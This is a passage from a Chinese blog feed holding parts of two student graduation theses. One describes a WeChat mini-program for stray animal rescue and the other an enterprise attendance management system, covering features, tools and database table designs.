反馈编号 || user_id     | int      | 用户编号 || content     | text     | 内容     || create_time | datetime | 创建时间 |<h3 id="5-系统实现">5 系统实现</h3><h4 id="5-1-管理员功能实现">5.1 管理员功能实现</h4><p>管理员的功能主要负责流浪动物救助系统的信息管理，及时维护系统日常的安全、稳定与高效，关注用户需求，审核用户发布信息，及时推送重要信息。同时，管理员还拥有管理员管理、用户信息管理、寻宠与招领信息管理、轮播图管理、资讯管理、反馈管理等功能。</p><h5 id="5-1-1-登录功能">5.1.1 登录功能</h5><p>当打开系统跳转到登陆界面，该界面所显示的操作界面信息主要是有用户名、密码以及验证码, 如果数据库已存入该管理员信息，当输入账户名和密码时,并在验证码正确的情况下可以直接登录进入主界面，相反将出现账户名或者密码错误的显示。如图5-1 所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\登录界面.jpg" style="zoom:50%;" /><center>图5-1 登录界面</center>##### 5.1.2 首页<p>管理员通过账户、密码验证成功后，登录进入管理后台首页。首页设有日历、反馈详情展示以及统计展示当前使用小程序的用户数量、用户发布的寻宠信息与招领信息的数量。如图5-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\首页界面.jpg" style="zoom:50%;" /><center>图5-2 首页界面</center>##### 5.1.3 管理员管理功能<p>登陆成功后进入后台管理主界面，点击管理员管理功能，完成管理员信息的新增、编辑、重置密码、删除等功能，其中设有超级管理员，拥有所有权限与功能，并负责为普通管理员分配使用权限。如图5-3、图5-4所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\管理员管理界面.jpg" style="zoom: 67%;" /><center>图5-3 管理员管理界面</center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\管理员分配菜单界面.jpg" style="zoom:67%;" /><center>图5-4 管理员分配菜单界面</center>##### 5.1.4 用户管理功能<p>管理员拥有对用户信息管理的功能，可以对用户信息进行编辑、审核与删除。用户忘记密码时不仅可以选择自主找回、重置密码，还可以通过联系管理员在后台重置用户密码；当用户账户异常时，可以及时停用该账户，维护系统安全。如图5-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\用户管理界面.jpg" style="zoom: 67%;" /><center>图5-5 用户管理界面</center>##### 5.1.5 菜单管理功能<p>菜单管理界面包含已经新增的所有菜单与按钮，已经被录入的菜单与按钮，才能被分配给管理员，经过分配后管理员才能拥有相关权限。如图5-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\菜单管理界面.jpg" style="zoom:67%;" /><center>图5-6 菜单管理界面</center>**5.1.6 动物分类管理功能**<p>动物分类管理界面，可以录入不同动物类型，方便用户选择动物类型进行信息发布与搜索，简洁高效，更精确的满足用户需求。如图5-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\动物分类管理界面.jpg" style="zoom:67%;" /><center>图5-7 动物分类管理界面</center>**5.1.7 寻宠管理功能**<p>寻宠管理界面展示所有用户发布的寻宠信息，可以查看当前寻宠信息是否已完成，可以进行热推让信息在小程序首页进行展示，管理员可以审核寻宠信息是否合规，不合规就禁止其发布，营造良好的网络环境。如图5-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠管理页面.jpg" style="zoom:67%;" /><center>图5-8 寻宠管理页面</center>##### 5.1.8 招领管理功能<p>招领管理界面展示所有用户发布的招领信息，可以查看当前招领信息是否已完成，可以进行热推让信息在小程序首页进行展示，管理员可以审核招领信息是否合规，不合规就禁止其发布。如图5-9所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领管理页面.jpg" style="zoom: 67%;" /><center>图5-9 招领管理页面</center>##### 5.1.9 轮播图管理功能<p>轮播图管理功能可以选择已发布的重要的寻宠与招领信息，通过点击发布使其在小程序首页进行轮播展示，更大限度的宣传流浪动物信息。如图5-10所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\轮播图管理界面.jpg" style="zoom:67%;" /><center>图5-10 轮播图管理界面</center>##### 5.1.10 反馈管理功能<p>反馈管理页面，负责接收用户的问题反馈，系统改进建议等，并在后台首页进行展示。管理员以及相关技术人员根据反馈及时改进系统功能，不断完善流浪动物救助系统。如图5-11所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\反馈管理界面.jpg" style="zoom:67%;" /><center>图5-11 反馈管理界面</center>##### 5.1.11 资讯管理功能<p>在资讯管理界面，管理员可以上传流浪动物救助相关事件与政策，在小程序首页进行展示宣传，提高用户对动物的爱护与救助意识。如图5-12所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\资讯管理界面.jpg" style="zoom:67%;" /> <center>图5-12 资讯管理界面</center>#### 5.2 用户功能实现<p>小程序用户模块主要实现发布、查看与救助相关流浪动物信息，完成动物救助与信息传播功能。用户具体拥有登录注册功能、个人中心功能、发布寻宠与招领信息功能、收藏功能、反馈功能与每日资讯功能等。</p><h5 id="5-2-1-登录注册功能">5.2.1 登录注册功能</h5><p>运行小程序进入登录界面，新用户进行注册，注册信息录入数据库后，用户可以成功进入小程序，若遗忘密码可以点击找回。如图5-13、图5-14、图5-15所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\登录界面.png"  />&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\注册界面.png"  />&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\忘记密码界面.png"  /></center> <center>图5-13&nbsp登录界面&nbsp &nbsp&nbsp&nbsp 图5-14&nbsp注册界面&nbsp&nbsp&nbsp&nbsp图5-15&nbsp忘记密码界面</center>##### 5.2.2 个人信息功能<p>在个人信息功能模块中，用户可以修改自己的个人资料，也可以修改帐号密码。单击“提交”按钮就可以进行个人资料的更新。如图 5-16、图5-17 所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\个人中心界面.png"  />&nbsp&nbsp&nbsp&nbsp<img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\信息修改界面.png"  /></center><center>图5-16 个人中心界面&nbsp&nbsp&nbsp&nbsp图5-17 信息修改界面</center>##### 5.2.3 寻宠功能<p>用户可以发布寻宠信息，通过选择动物类型精确查看寻宠信息及详情，不仅可以找回自己丢失的宠物，还可以收藏留意他人寻宠信息，促进形成互相帮助的良性循环。如图5-18、图5-19、图5-20所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠发布界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\寻宠界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的寻宠界面.png"  /></center><center>图5-18 寻宠发布界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-19 寻宠界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-20 我的寻宠界面</center>##### 5.2.4 招领功能<p>用户可以发布招领信息，通过选择动物类型精确查看招领信息及详情，不仅可以为动物寻找新主人，还可以收藏留意他人招领信息，领养一只属于自己的宠物，使流浪毛孩子不再流浪。如图5-21、图5-22、图5-23所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领发布界面.png"  />    <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\招领界面.png"  />    <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的招领界面.png"  /></center><center>图5-21 招领发布界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-22 招领界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-23 我的招领界面</center>##### 5.2.5 收藏功能<p>用户浏览动物信息，对于感兴趣的寻宠与招领信息进行收藏，实现信息的快速重现和个性化整理，在个人中心即可查看我的收藏，带给用户更快捷的体验。如图5-24所示</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\我的收藏界面.png"  /><center>图5-24&nbsp&nbsp&nbsp&nbsp我的收藏界面</center>##### 5.2.6 反馈功能<p>反馈功能作为产品方与用户之间沟通的桥梁，用户使用程序时遇到的问题，对程序的建议都可以反馈给管理员，根据用户反馈及时调整改善小程序，带给用户好的体验。如图5-25所示。</p><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\反馈界面.png"  /><center>图5-25&nbsp&nbsp&nbsp&nbsp反馈界面</center>##### 5.2.7 查看资讯<p>用户可以从首页进入资讯页面，阅读学习流浪动物救助相关政策法规，提高用户对流浪动物救助的意识和相关政策的理解，提高人们的责任意识，正确看待、救助与爱护流浪动物。如图5-26、图5-27、图5-28所示。</p><center><img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\首页.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\每日资讯界面.png"  />  <img src="D:\blog\shierjinghuang\source\_posts\基于微信小程序的流浪动物救助系统的设计与实现\资讯详情界面.png"  /><center><center>图5-26 首页&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-27 每日资讯界面&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图5-28 资讯详情界面</center># 6 总结<p>流浪动物救助问题是一个长期性、综合性的难题，无论是理论研究，还是系统的设计实现都具有一定的挑战性。系统的设计与实现利用新媒体技术介入解决流浪动物救助问题，探索流浪动物领养与救助在互联网时代下的创新，从实际出发，从动物的生命权与福利出发，通过运用文献研究、功能分析等方法对当前流浪动物存在的现状、原因、危害、已有的流浪动物治理模式以及相关者的需求进行了研究分析。最后结合互联网的优势，进行了融入情感化的设计，增加社交性和互动性，初步设计实现了基于微信小程序的流浪动物救助系统。</p><p>通过使用微信开发者工具创建小程序账号，初始化创建小程序项目。进行前端开发阶段，进行HTML、CSS和TypeScript的代码编写，利用微信小程序提供的组件和API构建与完善小程序的界面和功能，实现小程序内容与功能的基本渲染与实现，利用Vue框架基本完成后台管理系统页面的布局与实现。后端开发阶段，使用Spring Boot框架，编写TypeScript代码，通过Maven自动化构建工具完成包管理，实现处理接口的业务逻辑和数据交互，完成后端接口的准备与数据库结构设计。后端开发完成，完善前端小程序与后台管理系统，利用微信小程序提供的API调用后端接口，完善小程序与后台管理系统的数据访问与展示，实现数据交互。至此开发出小程序与前后端分离的、功能完善的、界面友好的基于微信小程序的流浪动物救助系统。</p><p>当前对流浪动物救助方面的关注与研究主要在保障流浪动物的生命权方面，在流浪动物的切实数据收集、解决流浪动物救助问题的实践、维护动物生存福利等方面上缺乏实现。流浪动物救助系统的开发与完善需要长期坚持，不断根据实际需求进行改进调整，在短时间内无法完整实现，所以流浪动物救助问题的解决并非一朝一夕之事，而是任重道远。</p><p>随着社会的发展与时代的进步，社会各界对流浪动物救助问题的意识逐渐提高，在保障流浪动物生存福利与完善流浪动物救助流程等方面的关注度在逐渐增加，相关政策的出台无疑是保障流浪动物们的生命线。随着国民对流浪动物救助问题的重视度的提高，社会各界自发公益救助动物，积极配合政府协同助力动物生命健康，促进人与动物和谐共生。未来，流浪动物救助与互联网的结合会越来越紧密，流浪动物救助系统也会一步完善与创新。</p><h2 id="参考文献">参考文献</h2><p>[1] 赵灿．《宠爱》移动应用设计的研究[D]．北京：北京印刷学院，2021：21-47．</p><p>[2] 邵帅．基于城市社区的社会创新设计研究[D]．合肥：合肥工业大学，2021：44-59．</p><p>[3] 李超．基于和谐社会视角下社会工作介入社区流浪动物现状及对策分析[D]．济南：山东大学，2024：12-48．</p><p>[4] 杨思涵．流浪动物相关法律与现实问题[J]．法制博览，2021(14)：154-156．</p><p>[5] 姜苏．基于互联网平台解决社会流浪动物问题的可行性研究[D]．泰安：山东农业大学，2021：21-47．</p><p>[6] 安琪．基于服务设计思维的城市流浪动物助养系统设计研究[D]．北京：北京化工大学，2023：9-59．</p><p>[7] 聂力，杜丹蕾，韦美雁等.基于微信小程序“送它回家”的设计与实现[J].电脑知识与技术,2023.19(02)：29-32．</p><p>[8] 郑妍，张未名，张润园等.基于云开发和微信小程序的爱宠家系统[J].电脑编程技巧与维护，2023(06)：79-81．</p><p>[9] 阙瑾蓉，卢嫣，丁雄等．“宠宠欲动”微信小程序设计与实现[J].信息系统工程，2021(02)：21-22．</p><p>[10] 卢艺轩,崔李宇,曹欣雨等.流浪犬猫的溯源生存现状及领养救助调研[J].中国动物保健,2022,24(12)：107-109．</p><p>[11] 邢月，喻德荣．简析流浪动物救助实践困境与路径优化[J]．大众标准化，2021(04)：71-73．</p><p>[12] 张家政．我国流浪动物的关怀伦理研究[D]．苏州：苏州科技大学，2023：8-11．</p><p>[13] 孙嘉慧．我国流浪动物致人损害侵权问题研究[D]．合肥：安徽大学，2023：10-16．</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基于微信小程序的流浪动物救助系统的设计与实现&quot;&gt;基于微信小程序的流浪动物救助系统的设计与实现&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;摘要&lt;/strong&gt;：随着人们生活水平的提高，人们对于精神层面的要求也日益提高。动物作为人类的陪伴对象，逐渐成为人们精神寄托的重要来源之</summary>
      
    
    
    
    <category term="项目设计" scheme="https://shierjinghuang.github.io/categories/%E9%A1%B9%E7%9B%AE%E8%AE%BE%E8%AE%A1/"/>
    
    
    <category term="毕业论文" scheme="https://shierjinghuang.github.io/tags/%E6%AF%95%E4%B8%9A%E8%AE%BA%E6%96%87/"/>
    
    <category term="MySQL" scheme="https://shierjinghuang.github.io/tags/MySQL/"/>
    
    <category term="Spring Boot" scheme="https://shierjinghuang.github.io/tags/Spring-Boot/"/>
    
  </entry>
  
  <entry>
    <title>智能考勤系统的设计与实现</title>
    <link href="https://shierjinghuang.github.io/2024/09/02/%E6%99%BA%E8%83%BD%E8%80%83%E5%8B%A4%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>https://shierjinghuang.github.io/2024/09/02/%E6%99%BA%E8%83%BD%E8%80%83%E5%8B%A4%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0/</id>
    <published>2024-09-02T07:39:07.000Z</published>
    <updated>2025-04-02T08:55:05.424Z</updated>
    
    <content type="html"><![CDATA[<h2 id="智能考勤系统的设计与实现">智能考勤系统的设计与实现</h2><p>**摘要：**在经历过疫情严重的生活后，网上招聘就业越来越流行，人才市场就业愈发激烈，所以使用开发工具IDEA、SPRING等技术学习开发的企业智能考勤信息系统。帮助企业更高效的管理员工信息以及上下班考勤情况。此企业考勤系统主要包括系统主管理员模块、企业管理模块、员工上下班考勤和请假、部门薪资等一系列结合而成。该系统可以方便信息的共享和管理、提高人力资源管理效率以及实现薪资数据自动汇总分析。综上所述，该系统对于企业而言，不仅能够提高管理效率，降低管理成本，而且能够加强对人力资源的管理、实现对企业的整体监控，对企业的长期稳定发展具有一定的帮助作用。</p><p>**关键词：**企业考勤 人事 薪资管理 JAVA SPRING</p><h3 id="引言">引言</h3><p>企业考勤管理系统的理论最早起源于西方发达国家，它是市场经济高度发达和现代社会化大生产发展的产物。考勤系统的理念提出历史已经十分悠久，而且经过长时间的实践和验证，已经不断完善成为公司必不可少的体系结构，在各个领域都及早地实现了由人力管理转向计算机管理的模式。企业考勤管理系统是为了解决职工考勤管理问题而设计的，目的是要实现对职工考勤的智能化、规范化管理，帮助考勤工作人员利用计算机技术方便快速的对企业各个部门的考勤信息进行管理，使散乱的考勤信息能够具体化、直观化。这样，系统所需的考勤工作人员数量减少，同时也减轻了他们的负担，有利于提高企业考勤管理的效率。而且企业考勤管理系统运用计算机管理技术，并通过不断的实践和修改，避免了人为管理的一些主观问题，运用最少的人力资源，实现员工考勤的高效管理。</p><h3 id="1-系统开发技术">1 系统开发技术</h3><p>系统开发工具及环境如表1-1所示</p><center>表1-1 系统开发工具及环境</center>| 序号 | 开发工具及环境 | 版本号 || ---- | -------------- | ------ || 1    | Windows        | 10     || 2    | Java JDK       | 1.8    || 3    | Idea           | 2020   || 4    | Tomcat         | 9.0    || 5    | MySQL          | 5.7    |<p>企业考勤管理系统基于idea软件开发平台，采用三层体系结构、B/S模式，采用Tomcat9.0作为服务器管理程序，在服务器端用JSP编写程序，实现客户机和服务器之间的交互功能。运用JDBC实现和数据库服务器上的MySQL数据库的数据交换。用户通过在客户端登录进入系统，借助IE浏览器访问Web服务器，即实现客户端与web服务器之间信息的存储与传递。本系统主要应用的技术是数据库的JDBC技术、SQL语句、JSP的内建对象以及JavaBean。</p><ol><li><p>将整个企业考勤管理系统开发过程进行划分。</p></li><li><p>使用了SSM+JSP的开发方式，自下而上进行开发。</p></li><li><p>先完成管理方面业务，再进行普通员工的业务开发。</p></li><li><p>在系统分析以及系统设计时，先进行对整体的分析，在进行模块的细分。</p></li><li><p>在系统实施阶段从基本模块开始，按照系统设计要求完成模块，再逐步拼接模块进行调试，最终完成整个系统</p></li></ol><h4 id="1-1-idea-2020">1.1  IDEA 2020</h4><p>IDEA全称IntelliJ IDEA，是Java语言开发的集成环境，是JetBrains公司的产品。IntelliJ在业界被公认为最好的Java开发工具，尤其在智能代码助手、代码自动提示、重构、Java EE支持、各类版本工具(git、svn等)、JUnit、CVS整合、代码分析、创新的GUI设计等方面的功能可以说是超常的。IDEA提倡的是智能编码，目的是减少程序员的工作，其特色功能有智能的选取、丰富的导航模式、历史记录功能等，最突出的功能是调试（Debug），可以对Java代码、JavaScript、JQuery等技术进行调试。因此智能考勤系统使用IDEA进行开发。</p><h4 id="1-2-java">1.2  JAVA</h4><p>Java是一种可以撰写跨平台应用程序的面向对象的程序设计语言。Java技术具有卓越的通用性、高效性、平台移植性和安全性，广泛应用于PC、数据中心、游戏控制台、科学超级计算机、移动电话和互联网，同时拥有全球最大的开发者专业社群。Java是功能完善的通用程序设计语言，可以用来开发可靠的、要求严格的应用程序。Java是纯面向对象开发，功能强大，分支众多，没有java不能做的软件。C/S也好B/S也好。从功能上讲，没有语言可以和Java相比。</p><h4 id="1-3-jsp">1.3  JSP</h4><p>JSP [Java Server Pages]，中文名是Java服务器页面，是一个简化的Servlet设计，是一种动态网页技术标准。JSP在传统的网页HTML [标准通用标记语言]的子集文件 [.htm，.html]中插入Java程序段 [Script lets]和JSP标记 [tag]，从而形成JSP文件，后缀名为[.jsp]。JSP实现了Html语法中的java扩展（以 &lt;%，%&gt;形式）。通常返回给客户端的就是一个HTML文本，因此客户端只要有浏览器就能浏览。JSP技术使用Java编程语言编写类XML的tags和script lets，来封装产生动态网页的处理逻辑。网页还能通过tags和script lets访问存在于服务端的资源的应用逻辑。JSP将网页逻辑与网页设计的显示分离，支持可重用的基于组件的设计，使基于Web的应用程序的开发变得容易。</p><h4 id="1-4-tomcat">1.4  Tomcat</h4><p>Tomcat服务器是一个开放源代码的免费的轻量级Web应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用。Tomcat可以用来装载Java Web程序，它是一个Servlets容器。它是一个中间件，在B/S架构中，浏览器发出的HTTP请求经过Tomcat中间件，转发到最终的目的服务器上，响应消息再通过Tomcat返回到浏览器。Tomcat所做的事情主要有：开启监听端口监听用户的请求，解析用户发来的HTTP请求然后访问到你指定的应用系统，然后你返回的页面经过Tomcat返回给用户。</p><h3 id="2系统需求分析">2系统需求分析</h3><p>企业考勤管理系统是企事业单位不可或缺的一部分，最初的考勤管理都是靠人工来完成的。当企业规模比较小的时候，人工可以完成，随着企业的规模越来越大，企业的员工人数也越来越多，人力进行考勤管理必然会造成工作效率低，工作错误增高的问题。因此对于企业来说，开发一个智能化、高效率的企业考勤管理系统是非常有必要的，具有深远的意义。</p><h4 id="2-1-系统功能需求分析">2.1  系统功能需求分析</h4><p>智能考勤系统应当具有足以满足企业日常需要的各项功能以方便管理，如下表中所示的八项功能</p><center>表2-1 系统功能</center>| 序号 | 功能名称 | 功能描述                         || ---- | -------- | -------------------------------- || 01   | 用户管理 | 使用考勤系统的所有用户信息       || 02   | 部门管理 | 企业所有的部门信息               || 03   | 职称管理 | 部门的职称                       || 04   | 员工管理 | 企业员工信息                     || 05   | 考勤管理 | 员工打卡签到信息管理员工加班管理 || 06   | 请假管理 | 员工请假信息申请批准             || 07   | 公告管理 | 公告信息                         || 08   | 薪资管理 | 薪资信息                         |<h3 id="3-系统设计">3 系统设计</h3><h4 id="3-1-系统体系结构设计">3.1 系统体系结构设计</h4><p>企业考勤管理系统分为三层，具体如图3-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业考勤管理系统体系结构图.png" style="zoom:67%;" /><center>图3-1 企业考勤管理系统体系结构图</center>####  3.2 系统功能结构设计<p>企业考勤管理系统的模块分为10部分，分别为注册登录、个人信息管理、请假信息管理、员工管理、加班信息管理、考勤信息管理、部门管理、职称管理、公告管理以及薪资管理，如图3-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业考勤管理系统结构图.png" style="zoom:80%;" /><center>图3-2 企业考勤管理系统结构图</center>系统分为多个角色，可以通过人事部主任账号对员工信息管理，以及对部门信息和职称信息统一管理，不同员工登陆的系统后可以操作不同的菜单功能。具体设计如图3-3、图3-4所示。<center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\管理员用例图.png" style="zoom:50%;" /><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\企业员工用例图.png" style="zoom:50%;" /></center><center>图3-3 管理员用例图&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp图3-4 企业员工用例图</center>#### 3.3 系统业务流程<p>管理员可以查看员工的考勤信息。部门主任在员工考勤完成后可以查看员工的考勤信息。人事部员工可以管理各个模块的信息。人事部主任可以管理所有信息同时负责员工的请假加班。具体业务流程如图3-5所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\核心业务流程图.png" style="zoom: 80%;" /><center>图3-5 核心业务流程图</center>#### 3.4 系统数据流分析<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\顶层数据流图.png" style="zoom:80%;" /><center>图3-6 顶层数据流图</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\一层数据流图.png" style="zoom:67%;" /><center>图3-7 一层数据流图</center>#### 3.5 数据库概念结构设计<p>人事部主任可以管理员工信息，员工添加请假信息，人事部主任负责审批请假信息。人事部主任管理员工的加班信息、公告信息。部门信息包括部门名称和部门职能，人事部主任管理部门信息和职能信息。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\系统整体E-R图.png" style="zoom: 67%;" /><center>图3-8 系统整体E-R图</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps13.png" style="zoom:50%;" /><center>图3-9员工表属性图</center>员工表的属性图如图3-9所示。其中员工ID为主键。员工通过用户名和密码来登录系统进行考勤。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps14.png" style="zoom:50%;" /><center>图3-10 部门表属性图</center>部门表的属性图如图3-10所示。部门表包括部门信息和部门职能，以及管理人员和联系方式。 <img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps15.png" alt="img" style="zoom:50%;" /><center>图3-11 职称表属性图</center>职能表的属性图如图3-11所示。职能表属于部门信息的一部分， 每个职能有自己的id和编号，名称，以及所属的哪个部门。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps16.png" style="zoom:50%;" /><center>图3-12 加班表属性图</center>加班表的属性图如图3-12所示。加班表负责储存需要加班的员工的信息，开始加班的时间和结束加班的时间。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps17.png" style="zoom:60%;" /><center>图3-13 请假表属性图</center>请假表的属性图如上图3-13所示。请假表负责储存请假员工的信息以及所属部门，请假天数，日期和原因。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps18.png" style="zoom:60%;" /><center>图3-14 考勤表属性图</center>考勤表的属性图如图3-14所示。考勤表负责记录员工的考勤时间，判断员工是否迟到。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\wps19.png" style="zoom:60%;" /><center>图3-15 公告表属性图</center>公告表的属性图如图3-15所示。公告表负责发布公告信息。<h4 id="3-6-数据库结构设计">3.6 数据库结构设计</h4><center>表3-2 数据库关系模式表</center>| 数据库表             | 关系模式                                                     || -------------------- | ------------------------------------------------------------ || `attendance`         | ( `id``employee_number``day` `time_type` `start_time` `start_type``end_time` `end_type``work_type`  `notes`) || `department`         | ( `id` `department_number` `name` `manager` `telephone` `address` `notes` ) || `employee`           | (`id` `employee_number` `name` `gender` `birthday` `telephone` `email` `address` `photo` `education``department_number` `position_number` `in_time` `password` `notes` ) || `gonggao`            | (`id`  `title` `content`)                                    || `history`            | (`id``employee_number` `name``gender` `birthday``telephone``email` `address` `photo`  `education``in_time` `out_time` `department_number` `position_number``status`  `home``notes`) || `lea`                | (`id` `employee_number` `department_number` `start_time` `end_time``days``reason` `type``manager` `status`  `notes`) || `move`               | ( `id` `employee_number` `before` `after` `time` `manager` `notes` ) || `overtime`           | (`id` `department_number` `employee_number` `day``start_time` `end_time` `notes`) || `position`           | ( `id` `position_number` `name`  `level` `notes`)            || `rewards_punishment` | (`id``employee_number``type``reason` `money`  `time` `manager``notes`) |<p>每张表具体的逻辑设计及其功能信息如表3-3所示。</p><center>表3-3 表</center>| 数据库表     | 表名       | 表功能             || ------------ | ---------- | ------------------ || `attendance` | 考勤表     | 存放考勤的基本信息 || `department` | 部门表     | 存放部门基本信息   || `employee`   | 员工表     | 存放员工基本信息   || `gonggao`    | 公告表     | 存放公告基本信息   || `history`    | 员工调度表 | 存放档案基本信息   || `lea`        | 请假表     | 存放请假基本信息   || `move`       | 离职表     | 存放离职基本信息   || `overtime`   | 加班表     | 存放加班基本信息   || `position`   | 职称表     | 存放职称基本信息   |<p><code>attendanc</code>表结构设计如表3-4所示。</p><center>表3-4attendance表结构设计</center>| No   | 字段名            | 类型    | 长度 | 主键/外键 | 描述     || ---- | ----------------- | ------- | ---- | --------- | -------- || 1    | `id`              | int     | 100  | 主键      | ID       || 2    | `employee_number` | int     | 10   |           | 员工编号 || 3    | `day`             | date    | 0    |           | 时间     || 4    | `time_type`       | Data    | 0    |           | 时间类型 || 5    | `start_time`      | time    | 0    |           | 开始时间 || 6    | `start_type`      | Data    | 0    |           | 开始类型 || 7    | `end_time`        | time    | 0    |           | 结束时间 || 8    | `end_type`        | Data    | 0    |           | 结束类型 || 9    | `work_type`       | Varchar | 0    |           | 工作类型 || 10   | `notes`           | varchar | 255  |           | 备注     |<p><code>department</code>表结构设计如表3-5所示。</p><center>表3-5 department表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | Int     | 10   | 主键      | ID       || 2    | `department_number` | Int     | 10   |           | 部门编号 || 3    | ` `name``           | Varchar | 20   |           | 名称     || 4    | `manager`           | Varchar | 10   |           | 管理     || 5    | `telephone`         | Varchar | 20   |           | 联系方式 || 6    | `address`           | Varchar | 50   |           | 地址     || 7    | `notes`             | Varchar | 255  |           | 备注     |<p><code>employee</code>表结构设计如表3-6所示。</p><center>表3-6 employee表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | Int     | 10   | 主键      | ID       || 2    | `employee_number`   | Int     | 10   |           | 员工编号 || 3    | ` name`             | Varchar | 10   |           | 名称     || 4    | `gender`            | Varchar | 0    |           | 性别     || 5    | `birthday`          | Date    | 0    |           | 生日     || 6    | `telephone`         | Varchar | 15   |           | 联系方式 || 7    | `email`             | Varchar | 30   |           | 邮箱     || 8    | `address`           | Varchar | 50   |           | 地址     || 9    | `photo`             | Varchar | 50   |           | 照片     || 10   | `education`         | Varchar | 20   |           | 教育     || 11   | `department_number` | Int     | 10   |           | 部门编号 || 12   | `position_number`   | Int     | 10   |           | 职称编号 || 13   | `in_time`           | Date    | 0    |           | 参加时间 || 14   | `password`          | Varchar | 20   |           | 密码     || 15   | `notes`             | Varchar | 255  |           | 状态     |<p><code>gonggao</code>表结构设计如表3-7所示。</p><center>表3-7 gonggao表结构设计</center>| No   | 字段名    | 类型    | 长度 | 主键/外键 | 描述 || ---- | --------- | ------- | ---- | --------- | ---- || 1    | `id`      | Int     | 11   | 主键      | ID   || 2    | `title`   | Varchar | 255  |           | 标题 || 3    | `content` | Varchar | 255  |           | 详情 |<p><code>history</code>表结构设计如表3-8所示。</p><center>表3-8 history表结构设计</center>| No   | 字段名              | 类型    | 长度 | 主键/外键 | 描述     || ---- | ------------------- | ------- | ---- | --------- | -------- || 1    | `id`                | int     | 10   | 主键      | ID       || 2    | `employee_number`   | int     | 10   |           | 员工编号 || 3    | ` name`             | varchar | 10   |           | 名称     || 4    | `gender`            | Varchar | 